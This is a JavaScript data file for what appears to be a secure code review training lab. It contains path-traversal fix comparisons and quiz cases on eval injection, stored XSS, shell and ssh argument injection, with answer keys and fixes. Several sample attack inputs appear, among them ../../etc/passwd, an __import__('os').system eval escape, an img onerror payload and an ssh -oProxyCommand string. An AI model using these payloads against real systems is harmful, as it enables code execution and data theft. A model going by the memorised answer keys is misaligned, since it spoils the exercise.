                  { out: 'PDF returned', pass: true },
                  { out: 'Single pass leaves ../../etc/passwd: file returned', pass: false },
                  { out: 'Absolute path: path.resolve ignores BASE, /etc/shadow read attempted', pass: false },
                  { out: 'Decoded twice to ../app/.env, then stripped to app/.env inside BASE: 404', pass: true },
                  { out: 'Stripped to invoices-archive/acme-2025.pdf inside BASE: 404', pass: true },
                  { out: 'Link followed: /etc/hostname returned', pass: false },
                  { out: 'URIError thrown: 500 with stack trace', pass: false },
                ],
              },
              {
                label: 'String prefix check: full.startsWith(BASE)',
                code: "const full = path.resolve(BASE, decodeURIComponent(req.query.file));\nif (!full.startsWith(BASE)) return res.sendStatus(403);",
                results: [
                  { out: 'PDF returned', pass: true },
                  { out: 'Resolves inside BASE as ..../..../etc/passwd: 404', pass: true },
                  { out: '403', pass: true },
                  { out: '/srv/app/.env: 403', pass: true },
                  { out: '/srv/invoices-archive/... starts with /srv/invoices: other customer file returned', pass: false },
                  { out: 'String check passes; link followed: /etc/hostname returned', pass: false },
                  { out: 'URIError thrown: 500 with stack trace', pass: false },
                ],
              },
              {
                label: 'Decode once, reject malformed, realpath, component containment',
                code: [
                  'const raw = req.query.file;   // decoded once by the framework; never decode again',
                  "if (typeof raw !== 'string' || /[%\\0]/.test(raw) || path.isAbsolute(raw)) return res.sendStatus(400);",
                  'let real;',
                  'try { real = await fs.realpath(path.join(BASE_REAL, raw)); } catch { return res.sendStatus(404); }',
                  'const rel = path.relative(BASE_REAL, real);',
                  "if (!rel || rel === '..' || rel.startsWith('..' + path.sep) || path.isAbsolute(rel)) return res.sendStatus(404);",
                  "res.type('pdf').send(await fs.readFile(real));   // TOCTOU: link could change before this read",
                ].join('\n'),
                results: [
                  { out: 'PDF returned', pass: true },
                  { out: 'Resolves inside BASE as ..../..../etc/passwd: 404', pass: true },
                  { out: '400 absolute path', pass: true },
                  { out: '400: still contains % after the single decode', pass: true },
                  { out: 'rel is ../invoices-archive/...: 404', pass: true },
                  { out: 'realpath is /etc/hostname, rel starts with ..: 404', pass: true },
                  { out: '400: contains %', pass: true },
                ],
              },
              {
                label: 'Server-managed invoice IDs owned by the user',
                code: [
                  "const row = await db.invoices.findOne({ id: String(req.query.id), customerId: req.user.customerId });",
                  'if (!row) return res.sendStatus(404);',
                  "res.type('pdf').send(await fs.readFile(path.join(BASE, row.storedName)));   // storedName set by server",
                ].join('\n'),
                results: [
                  { out: 'id for INV-1042 → PDF returned', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
  ];

  // Queue cases: title, alert, scenario, code and options must not name the weakness class. cwe is shown after submission.
  const queue = [
    {
      id: 'q-columns',
      title: 'Case 1 · reporting service',
      scenario: 'Analysts add computed columns to saved reports.',
      alert: { rule: 'taint/request-to-sensitive-call', severity: 'High', location: 'reports/columns.py:6', message: 'Request-derived value reaches a sensitive call.' },
      lang: 'Python (Flask)',
      code: [
        '# reports/columns.py',
        '@app.post("/reports/<rid>/columns")',
        'def add_column(rid):',
        '    expr = request.json["formula"]        # e.g. "row[\'qty\'] * row[\'price\']"',
        '    rows = load_rows(rid)',
        '    for row in rows:',
        '        row["computed"] = eval(expr, {}, {"row": row})',
        '    return jsonify(rows)',
      ].join('\n'),
      source: { options: ['request.json["formula"] — request body', 'load_rows(rid) — rows from the report store', 'The empty {} globals argument to eval()', 'jsonify(rows) output'], answer: 0 },
      sink: { options: ['jsonify(rows) response', 'eval(expr, ...)', 'load_rows(rid) data load', 'row["computed"] assignment'], answer: 1 },
      control: { options: ['Missing CSRF token', 'Control present: the empty {} globals sandbox the expression', 'No formula parser; {} globals still get builtins', 'Missing pagination'], answer: 2 },
      cls: 'confirmed',
      cwe: 'CWE-95 (Eval Injection), a child of CWE-94',
      worked: [
        'eval with {} globals still gets __builtins__, so __import__("os").system(...) runs. Any analyst account becomes code execution on the reporting host.',
        'Replace with a small arithmetic parser over known column names, or a fixed set of named computations.',
      ],
      model: {
        impact: 'Code execution on the reporting service with its database credentials.',
        ticket: 'Replace eval in add_column with a parser that accepts numbers, row field names from the report schema and + - * / ( ).',
        verification: "row['qty'] * row['price'] still computes; __import__ and attribute access return 400.",
      },
    },
    {
      id: 'q-comments',
      title: 'Case 2 · discussion widget',
      scenario: 'Comments written by other users are loaded and listed under an article.',
      alert: { rule: 'taint/api-to-dom', severity: 'Medium', location: 'public/comments.js:4', message: 'API response field written to the page.' },
      lang: 'JavaScript (browser)',
      code: [
        '// public/comments.js',
        "for (const c of await api.get('/threads/' + threadId + '/comments')) {",
        "  const li = document.createElement('li');",
        "  li.innerHTML = '<b>' + c.author + '</b> ' + c.body;",
        '  list.append(li);',
        '}',
      ].join('\n'),
      source: { options: ['threadId — selects which thread to load', "document.createElement('li') call", 'c.author / c.body from the API', 'list element'], answer: 2 },
      sink: { options: ['li.innerHTML assignment', 'list.append(li)', 'api.get(...) fetch', "createElement('li')"], answer: 0 },
      control: { options: ['Missing server rate limit on comments', 'Control present: comments come from our own API', 'Missing pagination', 'textContent / text nodes not used'], answer: 3 },
      cls: 'confirmed',
      cwe: 'CWE-79 (stored, rendered by DOM code)',
      worked: [
        'Comments are stored once and replayed to every reader. innerHTML parses author and body as markup, so a comment containing an img onerror runs in each reader\'s session.',
        'Build the bold name with createElement("b") + textContent and append the body with a text node. Only if comments are meant to be rich HTML, use a maintained sanitizer.',
      ],
      model: {
        impact: 'Script runs for every reader of the thread: account actions and data theft at scale.',
        ticket: 'In comments.js construct nodes with createElement/textContent; ban innerHTML for API data.',
        verification: 'A comment "<img src=x onerror=alert(1)>" shows as text; normal comments with & and < display exactly.',
      },
    },
    {
      id: 'q-avatar',
      title: 'Case 3 · account service',
      scenario: 'Users fetch their own avatar image.',
      alert: { rule: 'taint/user-to-file-path', severity: 'High', location: 'avatars.js:4', message: 'User property used to build a file path.' },
      lang: 'JavaScript (Node/Express)',
      code: [
        '// avatars.js',
        "const AVATARS = '/srv/avatars';",
        "app.get('/me/avatar', requireLogin, (req, res) => {",
        "  res.sendFile(path.join(AVATARS, req.user.avatarId + '.webp'));",
        '});',
        '',
        '// upload.js (only writer of avatarId):',
        '//   user.avatarId = crypto.randomUUID();   // column NOT NULL, CHECK uuid format',
        '// No route lets a user set avatarId directly.',
      ].join('\n'),
      source: { options: ['req.query.file', 'req.user.avatarId — user record field', 'Request URL path', 'Upload filename'], answer: 1 },
      sink: { options: ['crypto.randomUUID() in upload.js', 'requireLogin middleware', "The '.webp' file extension suffix", 'res.sendFile(path.join(...))'], answer: 3 },
      control: { options: ['No ../ filtering or normalisation on avatarId', 'No prefix check on the joined path', 'Control present: randomUUID() + uuid CHECK', 'Missing decodeURIComponent'], answer: 2 },
      cls: 'false-positive',
      cwe: 'Rule maps to CWE-22; not exploitable here (false positive)',
      worked: [
        'The scanner treated req.user as tainted. The evidence shows avatarId is only written by upload.js with randomUUID, constrained by a database CHECK, and no route accepts it from the client. That is the server-managed ID pattern.',
        'Close as false positive with that evidence; keep a regression test that avatarId cannot be set through profile update.',
      ],
      model: {
        impact: 'None with current code: the user cannot influence the path segment.',
        ticket: 'Close as false positive; add a test asserting PATCH /me ignores avatarId and a scanner suppression citing upload.js.',
        verification: 'Test proves avatarId is unchanged after a PATCH containing avatarId="../../etc/passwd"; DB CHECK rejects non-UUID values.',
      },
    },
    {
      id: 'q-thumbs',
      title: 'Case 4 · media worker',
      scenario: 'A background worker makes thumbnails for jobs queued by another service.',
      alert: { rule: 'taint/format-to-process', severity: 'High', location: 'jobs/thumbs.py:4', message: 'Formatted string passed to a process call.' },
      lang: 'Python',
      code: [
        '# jobs/thumbs.py',
        'def make_thumb(job):',
        '    cmd = settings.THUMB_CMD.format(src=job.src_path, dst=job.dst_path)',
        '    subprocess.run(cmd, shell=True, check=True)',
        '',
        '# settings.THUMB_CMD = "convert {src} -resize 256x256 {dst}"',
        '# job.src_path / dst_path are set by media-ingest (separate repo, not in this review).',
      ].join('\n'),
      source: { options: ['settings.THUMB_CMD — deploy-time config', 'check=True — raise on non-zero exit', 'The worker queue name', 'job.src_path / job.dst_path'], answer: 3 },
      sink: { options: ['settings.THUMB_CMD.format(src=..., dst=...)', 'settings import', 'subprocess.run(cmd, shell=True)', 'make_thumb return'], answer: 2 },
      control: { options: ['Control present: paths are always server-generated', 'shell=True string; no argv list or path checks', 'Missing HTML encoding', 'Missing rate limit'], answer: 1 },
      cls: 'needs-evidence',
      cwe: 'Would be CWE-78 if users influence the paths; evidence missing',
      worked: [
        'The sink is dangerous (a shell parses the formatted string), but whether an attacker controls src_path is decided in media-ingest, which this review cannot see. Confirming or dismissing would be a guess.',
        'Request the ingest code path for src_path (does it keep the upload filename?) and sample queued jobs. Meanwhile, recommend list arguments without shell=True as cheap hardening.',
      ],
      model: {
        impact: 'If upload filenames reach src_path: command execution on the media worker. If not: none.',
        ticket: 'Ask media-ingest owners how src_path is generated and attach samples; hardening: the worker builds src/dst itself as absolute paths under a fixed media directory from server-generated names (e.g. uuid + .png, so no argument can start with "-"), validates them, and calls subprocess.run(["/usr/bin/convert", src, "-resize", "256x256", dst]) without shell=True.',
        verification: 'Evidence shows the path origin; a job with src_path "a.png;id" is rejected or handled as a literal file name.',
      },
    },
    {
      id: 'q-uptime',
      title: 'Case 5 · on-call console',
      scenario: 'On-call engineers check uptime of a fleet host typed into a form. No shell is used.',
      alert: { rule: 'taint/request-to-process-arg', severity: 'Medium', location: 'fleet.js:5', message: 'Request value passed as process argument.' },
      lang: 'JavaScript (Node/Express)',
      code: [
        '// fleet.js',
        "const { execFile } = require('node:child_process');",
        "app.post('/fleet/uptime', requireLogin, (req, res) => {",
        '  const host = String(req.body.host);            // e.g. "web-03.internal"',
        "  execFile('/usr/bin/ssh', ['-o', 'BatchMode=yes', host, 'uptime'],",
        "    (err, out) => res.type('text').send(err ? 'unreachable' : out));",
        '});',
      ].join('\n'),
      source: { options: ['req.body.host', "'BatchMode=yes' literal", "'uptime' literal", 'out — process output'], answer: 0 },
      sink: { options: ['A shell parses host before ssh runs', 'host as an ssh argv element', "res.type('text').send(out)", 'requireLogin — console login check'], answer: 1 },
      control: { options: ['No shell escaping of host', 'Missing output encoding', 'Control present: execFile avoids the shell', 'host not checked against the fleet inventory'], answer: 3 },
      cls: 'confirmed',
      cwe: 'CWE-88 (Argument Injection), related to CWE-78',
      worked: [
        'execFile avoids the shell, but ssh reads its own options. host = -oProxyCommand=sh -c "id>/tmp/p" makes ssh run that proxy command locally, without any shell metacharacter parsing by Node.',
        'Accept only hostnames from the fleet inventory, reject leading "-", and keep options fixed in code.',
      ],
      model: {
        impact: 'Command execution on the console host via ssh ProxyCommand; access to its SSH keys.',
        ticket: 'In /fleet/uptime look up host in the inventory and pass the inventory value; 400 for unknown hosts.',
        verification: 'web-03.internal works; -oProxyCommand=... and any value starting with "-" return 400.',
      },
    },
  ];

  const LAB = { modules, queue };
  if (typeof module !== 'undefined' && module.exports) module.exports = LAB;
  else window.LAB = LAB;
})();
